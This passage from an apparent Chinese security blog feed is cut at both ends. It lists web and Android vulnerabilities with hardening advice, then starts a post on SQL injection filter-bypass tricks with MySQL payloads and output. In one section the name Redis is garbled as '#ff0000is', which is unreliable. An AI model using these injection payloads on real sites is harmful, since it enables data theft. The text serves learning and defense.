font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>检测中发现登录请求（例如：用户名、密码、电子邮件地址、社会安全号码等）被发送到服务器的过程中并未采用通讯加密协议或加密。恶意人员可通过数据截包实现网站管理员用户名、密码信息的截获。<br><strong>加固建议：</strong><br>注册或登录时，客户发送请求敏感信息进行加密，例如密码、电话、邮件等敏感信息进行加密传输。</p><h2 id="Memcached-未授权访问漏洞"><a href="#Memcached-未授权访问漏洞" class="headerlink" title="Memcached 未授权访问漏洞"></a>Memcached 未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。<br><strong>加固建议：</strong><br>1.配置memcached监听本地回环地址127.0.0.1。<br>2.当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。</p><h2 id="rsync未授权访问漏洞"><a href="#rsync未授权访问漏洞" class="headerlink" title="rsync未授权访问漏洞"></a>rsync未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>rsync是类unix系统下的数据镜像备份工具，如果配置不当，可导致攻击者匿名访问rsync程序，进一步进行增删改等操作。<br><strong>加固建议：</strong><br>建议两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p><h2 id="WebSphere绕过安全限制漏洞"><a href="#WebSphere绕过安全限制漏洞" class="headerlink" title="WebSphere绕过安全限制漏洞"></a>WebSphere绕过安全限制漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在Java端”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII低字符”.”。通过这个方法可以绕过目录保护读取包配置文件信息，包括web-inf和meta-inf目录下的内容。攻击者还可以利用此漏洞查看或执行war包里面的文件。此漏洞影响WebSphere Application Server 版本5.1, 6.0, 6.1 和7.0。<br><strong>加固建议：</strong><br>升级WebSphere至最新版，或安装PK81387安全补丁。<br><a href="http://www-01.ibm.com/support/docview.wss?uid=swg24022456">http://www-01.ibm.com/support/docview.wss?uid=swg24022456</a></p><h2 id="cisco-vpn未授权访问"><a href="#cisco-vpn未授权访问" class="headerlink" title="cisco vpn未授权访问"></a>cisco vpn未授权访问</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Cisco Adaptive Security Appliance (ASA) Software在Clientless SSL VPN入口自定义框架在实现上存在安全漏洞，未经身份验证的远程攻击者可利用此漏洞修改Clientless SSL VPN入口内容，导致窃取凭证、跨站脚本及其他攻击。此漏洞源于没有正确实现Clientless SSL VPN入口自定义框架内的身份验证检查。<br><strong>加固建议：</strong><br>建议升级思科最新发布的补丁：<br><a href="http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa">http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa</a></p><h2 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库，一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息。<br><strong>加固建议：</strong><br>针对域传送漏洞，建议通过定义ACL(访问控制列表)来限制在域名服务器之间的区域传送，通常可编辑/etc/named.conf中allow-transfer参数。存在漏洞的是ns1.com, 如果其他ns2、ns3、ns4是备用dns服务器，那么应该只允许域传送至其他对应的地址。配置如下：<br>allow-transfer { localhost; ns2的IP; ns3的IP; ns4的IP;};</p><h2 id="Mongodb数据库未授权访问漏洞"><a href="#Mongodb数据库未授权访问漏洞" class="headerlink" title="Mongodb数据库未授权访问漏洞"></a>Mongodb数据库未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Mongodb在启动的时候未设置 –auth参数，造成恶意攻击者可使用默认空口令登陆到数据服务器。<br><strong>加固建议：</strong><br>建议增加数据库用户校验或限制设备登录IP地址，限制未授权访问。</p><h2 id="ff0000is数据库未授权访问漏洞"><a href="#ff0000is数据库未授权访问漏洞" class="headerlink" title="#ff0000is数据库未授权访问漏洞"></a>#ff0000is数据库未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>#ff0000is 默认情况下会绑定在 0.0.0.0:6379，这样将会将 #ff0000is 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 #ff0000is 以及读取 #ff0000is 的数据。攻击者在未授权访问 #ff0000is 的情况下可以利用 #ff0000is的相关方法，可以成功在 #ff0000is 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。<br><strong>加固建议：</strong><br>1.配置bind选项，限定可以连接#ff0000is服务器的IP，修改 #ff0000is 的默认端口6379<br>2.配置认证，也就是AUTH，设置密码，密码会以明文方式保存在#ff0000is配置文件中<br>3.配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度<br>4.好消息是#ff0000is作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config等。</p><h2 id="phpmyadmin未授权访问"><a href="#phpmyadmin未授权访问" class="headerlink" title="phpmyadmin未授权访问"></a>phpmyadmin未授权访问</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>发现phpmyadmin路径，且没有密码保护，可直接登录数据库，获得数据库root权限。<br><strong>加固建议：</strong><br>设置数据库密码防止未授权访问，修改phpmyadmin默认路径防止被攻击者发现。</p><h2 id="htaccess文件未授权访问"><a href="#htaccess文件未授权访问" class="headerlink" title=".htaccess文件未授权访问"></a>.htaccess文件未授权访问</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者可未授权访问.htaccess文件，泄露网站敏感信息。<br><strong>加固建议：</strong><br>禁止.htaccess文件被查看</p><h2 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>包括但不限于：网站登录/FTP/SSH/数据库/中间件等，攻击者可猜解用户登录口令登录系统，实施进一步渗透攻击。<br><strong>加固建议：</strong><br>针对弱口令漏洞，建议用户及时修改密码，加强口令强度，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。</p><h2 id="SNMP默认团体名漏洞"><a href="#SNMP默认团体名漏洞" class="headerlink" title="SNMP默认团体名漏洞"></a>SNMP默认团体名漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于很多操作系统或者网络设备的SNMP代理服务存在可读默认口令。如果这些默认口令没有修改或者为弱口令，远程攻击者就可以通过SNMP代理获取系统的很多细节信息。如果攻击者得到了可写口令，它甚至可以修改系统文件或者执行系统命令。<br><strong>加固建议：</strong><br>针对SNMP信息泄露漏洞，建议修改SNMP缺省口令或者关闭SNMP服务。</p><h2 id="FTP开启匿名登录"><a href="#FTP开启匿名登录" class="headerlink" title="FTP开启匿名登录"></a>FTP开启匿名登录</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者可利用弱口令或匿名登录漏洞直接登录 FTP 服务，上传恶意文件，从而获取系统权限，并可能造成数据泄露。<br><strong>加固建议：</strong><br>FTP服务为明文传输，建议使用SFTP代替，如需要继续休使用建议，禁止匿名登录，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。</p><h2 id="会话劫持漏洞"><a href="#会话劫持漏洞" class="headerlink" title="会话劫持漏洞"></a>会话劫持漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者通过暴力破解、预测或者窃取（网络嗅探/XSS攻击）等方式获取用户Session ID后，使用该Session ID登录目标账号的攻击方法。<br><strong>加固建议：</strong><br>1.更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。<br>2.关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。<br>3.设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。<br>4.关闭所有phpinfo类dump request信息的页面。<br>5.使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致。</p><h2 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。<br><strong>加固建议：</strong><br>1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。<br>2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。</p><h2 id="会话cookie中缺少HttpOnly属性"><a href="#会话cookie中缺少HttpOnly属性" class="headerlink" title="会话cookie中缺少HttpOnly属性"></a>会话cookie中缺少HttpOnly属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>如不设置此属性，攻击者可配合跨站脚本盗取cookie。设置此属性，即使有跨站漏洞存在，也很难利用。<br><strong>加固建议：</strong><br>在服务器端设置cookie的HttpOnly属性为真。</p><h2 id="未禁用密码表单自动完成属性"><a href="#未禁用密码表单自动完成属性" class="headerlink" title="未禁用密码表单自动完成属性"></a>未禁用密码表单自动完成属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>自动填写未对密码字段禁用的 HTML 属性。<br><strong>加固建议：</strong><br>将“autocomplete”属性正确设置为“off”。</p><h2 id="会话cookie中缺少secure属性"><a href="#会话cookie中缺少secure属性" class="headerlink" title="会话cookie中缺少secure属性"></a>会话cookie中缺少secure属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>可能会窃取在加密的会话期间发送的用户和会话信息。<br><strong>加固建议：</strong><br>服务器开启了Https时，cookie的Secure属性应设为true</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>后台页面或者其他用户页面没有做session认证，导致可以无需登录，直接访问页面。<br><strong>加固建议：</strong><br>对未授权访问页面做session认证，严格审核后台功能页面的访问权限，若为未登录用户则拒绝访问。</p><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>水平越权：攻击者能够执行与自己同级别权限用户的操作<br>垂直越权：攻击者能够执行高级别权限用户的操作，比如管理员的相关操作。<br><strong>加固建议：</strong><br>1.设计严格的权限控制系统，对于每个请求和URL都要进行校验和权限确认，防止非法请求被执行；<br>2.默认情况下，应该拒绝执行所有访问权限，也就是说缺省不给用户任何权限，防止攻击者利用缺省权限执行攻击等；<br>3.对于每个功能的访问，都要有明确的角色授权，防止黑客利用不完善的访问控制缺陷造成不必要的损失；<br>或者是实现Web访问的IP白名单列表，或者是只允许属于管理员范围权利的指定IP访问等等。</p><h2 id="任意用户密码重置漏洞"><a href="#任意用户密码重置漏洞" class="headerlink" title="任意用户密码重置漏洞"></a>任意用户密码重置漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>系统在处理重置密码请求时使用本地验证方法，未在服务端处理，造成用户可在本地修改数据包，绕过系统身份验证，达到重置任意账号的目的。<br><strong>加固建议：</strong><br>针对任意用户密码重置漏洞，建议在服务器端加强逻辑验证。</p><h2 id="验证码漏洞"><a href="#验证码漏洞" class="headerlink" title="验证码漏洞"></a>验证码漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>验证码可以一次多用，导致可以暴力破解；<br>验证码没有限定次数和时间，导致可以无限制的发送验证码。<br><strong>加固建议：</strong><br>设置验证码登录一次，变换一次，防止暴力破解；设置验证码120秒只发送一次。</p><h2 id="暴力破解漏洞（登录页面密码猜测攻击）"><a href="#暴力破解漏洞（登录页面密码猜测攻击）" class="headerlink" title="暴力破解漏洞（登录页面密码猜测攻击）"></a>暴力破解漏洞（登录页面密码猜测攻击）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>登录入口没有验证码或者验证码可以一次多用，导致可以暴力破解。攻击者可能试图尝试每个可能的字母，数字和符号组合，或使用一些暴力破解工具进行猜测，直到它发现了一个正确的组合，从而进入登录页面做进一步深度非法攻击。<br><strong>加固建议：</strong><br>1.增加验证码，使之登录失败一次，验证码变换一次。<br>2.针对密码猜测，建议控制错误登录次数，以防止暴力破解。同一用户如果5分钟内登录失败6次，禁用此用户登录30分钟。</p><h2 id="用户名猜解漏洞"><a href="#用户名猜解漏洞" class="headerlink" title="用户名猜解漏洞"></a>用户名猜解漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>通过登录信息可以判断有无此用户，可以对用户名进行猜解。<br><strong>加固建议：</strong><br>使用模糊的错误登录提示，如：用户名或密码错误。</p><h2 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>短信轰炸是由于系统设计缺陷可无限制发送短信验证码给客户端，攻击者可利用该漏洞对任意手机号码进行短信轰炸，对公司造成不良影响和运行安全风险。<br><strong>加固建议：</strong><br>建议针对发送短信验证码接口加强权限控制，在服务端限制单位时间内发送短信次数。</p><h2 id="Webview远程代码执行漏洞"><a href="#Webview远程代码执行漏洞" class="headerlink" title="Webview远程代码执行漏洞"></a>Webview远程代码执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>WebView组件中的addJavascriptInterface方法用于实现本地Java和JavaScript的交互，但是该函数并没有对方法调用进行限制，导致攻击者可以调用任何JAVA类，最终导致JavaScript代码对设备进行任意攻击<br><strong>加固建议：</strong><br>建议不使用addJavascriptInterface接口，对于Android API Level为17或者以上的Android系统，Google规定允许被调用的函数，必须在Java的远程方法上面声明一个@JavascriptInterface注解；在使用js2java的bridge时候，需要对每个传入的参数进行验证，避免恶意代码的攻击。</p><h2 id="代码动态加载安全检测"><a href="#代码动态加载安全检测" class="headerlink" title="代码动态加载安全检测"></a>代码动态加载安全检测</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用DexClassLoader或PathClassLoader动态加载dex文件、apk文件、jar文件时，如果这些文件存储在可被其他应用读写的目录中(比如sdcard)，同时没有对外部加载的文件进行完整性校验，导致应用可能会被恶意代码注入并执行。<br><strong>加固建议：</strong><br>将所需要动态加载的文件放置在apk内部，或应用私有目录中；如果应用必须要把所加载的文件放置在可被其他应用读写的目录中(比如sdcard)，建议对不可信的加载源进行完整性校验和白名单处理，以保证不被恶意代码注入</p><h2 id="应用签名未校验风险"><a href="#应用签名未校验风险" class="headerlink" title="应用签名未校验风险"></a>应用签名未校验风险</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>应用签名未校验，攻击者可伪造app程序。<br><strong>加固建议：</strong><br>增加程序本地签名校验及云端的签名校验</p><h2 id="篡改和二次打包风险"><a href="#篡改和二次打包风险" class="headerlink" title="篡改和二次打包风险"></a>篡改和二次打包风险</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>对移动应用进行破解、再篡改或插入恶意代码，最后重新打包生成一个新应用的过程，恶意程序通过插入广告、木马、病毒的方式窃取用户隐私、吸资扣费、耗费流量等。<br><strong>加固建议：</strong><br>增加程序本地签名校验及云端的签名校验。</p><h2 id="Java代码反编译风险"><a href="#Java代码反编译风险" class="headerlink" title="Java代码反编译风险"></a>Java代码反编译风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>可通过反编译工具获取java源代码，攻击者可获取源码信息执行更深入的渗透攻击。<br><strong>加固建议：</strong><br>1.隔离Java程序；<br>2.对Class文件进行加密；<br>3.代码混淆。</p><h2 id="资源文件泄露风险"><a href="#资源文件泄露风险" class="headerlink" title="资源文件泄露风险"></a>资源文件泄露风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露的js文件如果被读取，可能会造成功能逻辑泄露，如果被篡改，可能被植入钓鱼页面或恶意代码，造成用户的敏感信息泄露<br><strong>加固建议：</strong><br>对资源文件(.js)进行加密保护，防止资源文件泄露。</p><h2 id="Webview明文存储密码风险"><a href="#Webview明文存储密码风险" class="headerlink" title="Webview明文存储密码风险"></a>Webview明文存储密码风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>在使用WebView的过程中忽略了WebView setSavePassword，当用户选择保存在WebView中输入的用户名和密码，则会被明文保存到应用数据目录的databases/webview.db中。如果手机被root就可以获取明文保存的密码，造成用户的个人敏感数据泄露。<br><strong>加固建议：</strong><br>使用WebView.getSettings().setSavePassword(false)来禁止保存密码</p><h2 id="明文数字证书风险"><a href="#明文数字证书风险" class="headerlink" title="明文数字证书风险"></a>明文数字证书风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>明文存储的数字证书如果被篡改，可能会造成客户端与服务端之间的传输数据被截获并解密，造成用户信息泄露<br><strong>加固建议：</strong><br>对数字证书文件(.cer)进行加密，避免证书文件泄露</p><h2 id="应用数据任意备份风险"><a href="#应用数据任意备份风险" class="headerlink" title="应用数据任意备份风险"></a>应用数据任意备份风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Android 2.1 以上的系统可为App提供应用程序数据的备份和恢复功能，该由AndroidMainfest.xml文件中的allowBackup 属性值控制，其默认值为true。当该属性没有显式设置为false时,攻击者可通过adb backup 和adb restore对App的应用数据进行备份和恢复,从而可能获取明文存储的用户敏感信息，如用户的密码、证件号、手机号、交易密码、身份令牌、服务器通信记录等。利用此类信息攻击者可伪造用户身份，盗取用户账户资产，或者直接对服务器发起攻击。<br><strong>加固建议：</strong><br>关闭应用程序数据的备份和恢复功能。</p><h2 id="AES-DES加密方法不安全使用漏洞"><a href="#AES-DES加密方法不安全使用漏洞" class="headerlink" title="AES/DES加密方法不安全使用漏洞"></a>AES/DES加密方法不安全使用漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>使用AES/DES/DESede加密算法时，如果使用ECB模式，容易受到攻击风险，造成信息泄露<br><strong>加固建议：</strong><br>使用AES/DES/DESede加密算法时，应显示指定使用CBC或CFB加密模式</p><h2 id="敏感函数调用风险"><a href="#敏感函数调用风险" class="headerlink" title="敏感函数调用风险"></a>敏感函数调用风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>APP应用程序中调用了包含敏感行为的函数，包括发送短信、发送地理位置、拨打电话等，可能会导致用户隐私数据泄露等风险<br><strong>加固建议：</strong><br>开发者审核包含敏感行为的函数调用，确保其使用是必要且限制于授权用户的</p><h2 id="HTTP传输数据风险"><a href="#HTTP传输数据风险" class="headerlink" title="HTTP传输数据风险"></a>HTTP传输数据风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者在自己设置的钓鱼网络中配置DNS服务器，将软件要连接的服务器域名解析至攻击者的另一台服务器在，这台服务器就可以获得用户登录信息，或者充当客户端与原服务器的中间人，转发双方数据。<br><strong>加固建议：</strong><br>对敏感数据采用基于SSL/TLS的HTTPS进行传输。</p><h2 id="HTTPS未校验服务器证书漏洞"><a href="#HTTPS未校验服务器证书漏洞" class="headerlink" title="HTTPS未校验服务器证书漏洞"></a>HTTPS未校验服务器证书漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>虽然使用了https通信方式，但是只是简单的调用而已，并未对SSL证书有效性做验证，攻击者以轻易获取手机用户的明文通信信息。<br><strong>加固建议：</strong><br>对SSL证书进行有效性做验证</p><h2 id="Activity组件导出风险"><a href="#Activity组件导出风险" class="headerlink" title="Activity组件导出风险"></a>Activity组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Activity组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到绕过认证、恶意代码注入等攻击风险。<br><strong>加固建议：</strong><br>如果应用的Activity组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。</p><h2 id="Service组件导出风险"><a href="#Service组件导出风险" class="headerlink" title="Service组件导出风险"></a>Service组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Service组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限提升、拒绝服务等攻击风险。<br><strong>加固建议：</strong><br>如果应用的Service组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。</p><h2 id="Broadcast-Receiver组件导出风险"><a href="#Broadcast-Receiver组件导出风险" class="headerlink" title="Broadcast Receiver组件导出风险"></a>Broadcast Receiver组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Broadcast Receiver组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险<br><strong>加固建议：</strong><br>如果应用的Broadcast Receiver组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要接收外部应用发送的消息，建议对组件进行权限控制。</p><h2 id="系统组件本地拒绝服务检测"><a href="#系统组件本地拒绝服务检测" class="headerlink" title="系统组件本地拒绝服务检测"></a>系统组件本地拒绝服务检测</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的组件在处理Intent附加数据的时候，没有进行异常捕获，攻击者可通过向应用发送空数据、异常或畸形数据等，导致应用程序崩溃。<br><strong>加固建议：</strong><br>不必要导出的组件，建议显示设置组件的“android:exported”属性为false；在使用Intent获取附加数据时，使用try catch进行异常捕获和处理，防止抛出异常引发崩溃。</p><h2 id="Content-Provider组件导出风险"><a href="#Content-Provider组件导出风险" class="headerlink" title="Content Provider组件导出风险"></a>Content Provider组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Content Provider组件可以被第三方app任意调用，导致敏感信息泄露，并可能受到目录遍历、SQL注入等攻击风险<br><strong>加固建议：</strong><br>如果应用的Content Provider组件不必要导出，建议显式设置组件的“android:exported”属性为false；如果必须要有数据提供给外部应用使用，建议对组件进行权限控制。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞描述</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞描述</tag>
      
      <tag>解决建议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入常见技巧汇总</title>
    <link href="/p/a571637f.html"/>
    <url>/p/a571637f.html</url>
    
    <content type="html"><![CDATA[<h2 id="into绕过order-by-过滤"><a href="#into绕过order-by-过滤" class="headerlink" title="into绕过order by 过滤"></a>into绕过order by 过滤</h2><p><code>order by</code> 和 <code>into</code>两个都可以用来判断列数，但是两者是有区别的<br><code>order by </code>是你<code>select</code>了几个就可以在那几个的范围里面变动，超过就报错。</p><pre><code class="hljs mysql">mysql&gt; select username,password from users order by 1;+----------+------------+| username | password   |+----------+------------+| admin    | admin      || admin1   | admin1     || admin2   | admin2     || admin3   | admin3     || admin4   | admin4     || Angelina | I-kill-you || batman   | mob!le     || dhakkan  | dumbo      || Dumb     | Dumb       || Dummy    | p@ssword   || hello    | world      || secure   | crappy     || stupid   | stupidity  || superman | genious    |+----------+------------+14 rows in set (0.01 sec)mysql&gt; select username,password from users order by 2;+----------+------------+| username | password   |+----------+------------+| admin    | admin      || admin1   | admin1     || admin2   | admin2     || admin3   | admin3     || admin4   | admin4     || secure   | crappy     || Dumb     | Dumb       || dhakkan  | dumbo      || superman | genious    || Angelina | I-kill-you || batman   | mob!le     || Dummy    | p@ssword   || stupid   | stupidity  || hello    | world      |+----------+------------+14 rows in set (0.00 sec)mysql&gt; select username,password from users order by 3;ERROR 1054 (42S22): Unknown column &#39;3&#39; in &#39;order clause&#39;</code></pre><p><code>into</code> 就比较死板，必须是你<code>select</code> 了几个就要<code>into</code> 几个，少了多了都不行。而且必须是一行才可以所以必须要limit.（1.select into 本是一个备份内容的操作。2.@是一个变量符号）</p><pre><code class="hljs mysql">mysql&gt; select username,password from users into @;ERROR 1222 (21000): The used SELECT statements have a different number of columnsmysql&gt; select username,password from users into @,@;ERROR 3061 (42000): User variable name &#39;&#39; is illegalmysql&gt; select username,password from users into @,@,@;ERROR 1222 (21000): The used SELECT statements have a different number of columns</code></pre><blockquote><p>order by 只能在 limit前使用,into 只能在limit 之后使用</p></blockquote><pre><code class="hljs mysql">mysql&gt; select * from users limit 1,1 order by 3;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;order by 3&#39; at line 1mysql&gt; select * from users order by 3 limit 1,1;+----+----------+----------+| id | username | password |+----+----------+----------+|  9 | admin1   | admin1   |+----+----------+----------+1 row in set (0.00 sec)</code></pre><pre><code class="hljs mysql">mysql&gt; select * from users limit 1,1 into @,@,@;ERROR 3061 (42000): User variable name &#39;&#39; is illegalmysql&gt; select * from users into @,@,@ limit 1,1;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;limit 1,1&#39; at line 1</code></pre><p>小结：<code>order by</code> 过滤了用<code>into</code></p><h2 id="16进制绕过引号"><a href="#16进制绕过引号" class="headerlink" title="16进制绕过引号"></a>16进制绕过引号</h2><p>有些时候过滤了引号，导致字符串不能写入，我们可以用字符串的16进制形式绕过，这样就不需要引号了。还有<code>hex()</code>和<code>unhex()</code>这两个函数可以使用。</p><pre><code class="hljs mysql">select column_name from information_schema.columns where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;0x7573657273</code></pre><h2 id="等于号过滤使用like-或者-in-绕过"><a href="#等于号过滤使用like-或者-in-绕过" class="headerlink" title="等于号过滤使用like 或者 in 绕过"></a>等于号过滤使用like 或者 in 绕过</h2><p>等号过滤用<code>in</code>或<code>like </code>代替</p><pre><code class="hljs mysql">substr(password,1,1) in(&#39;p&#39;);substr(password,1,1) like(&#39;p&#39;);mysql&gt; select * from users where username in(&#39;admin&#39;);+----+----------+----------+| id | username | password |+----+----------+----------+|  8 | admin    | admin    |+----+----------+----------+1 row in set (0.00 sec)</code></pre><p><code>in</code> 还能通过<code>order by</code> 指定顺序</p><pre><code class="hljs mysql">select * from users where id IN (3,6,9,1,2,5,8,7) order by field(id,3,6,9,1,2,5,8,7);</code></pre><h2 id="lt-，-gt-代替等于号构造真值"><a href="#lt-，-gt-代替等于号构造真值" class="headerlink" title="&lt;，&gt; 代替等于号构造真值"></a>&lt;，&gt; 代替等于号构造真值</h2><pre><code class="hljs mysql">or swords &gt; swor swords &lt; twor 1&lt;3</code></pre><h2 id="字符串相等绕过"><a href="#字符串相等绕过" class="headerlink" title="字符串相等绕过"></a>字符串相等绕过</h2><pre><code class="hljs mysql">or &#39;swords&#39; &#x3D; &#39;swords&#39;</code></pre><h2 id="sleep过滤"><a href="#sleep过滤" class="headerlink" 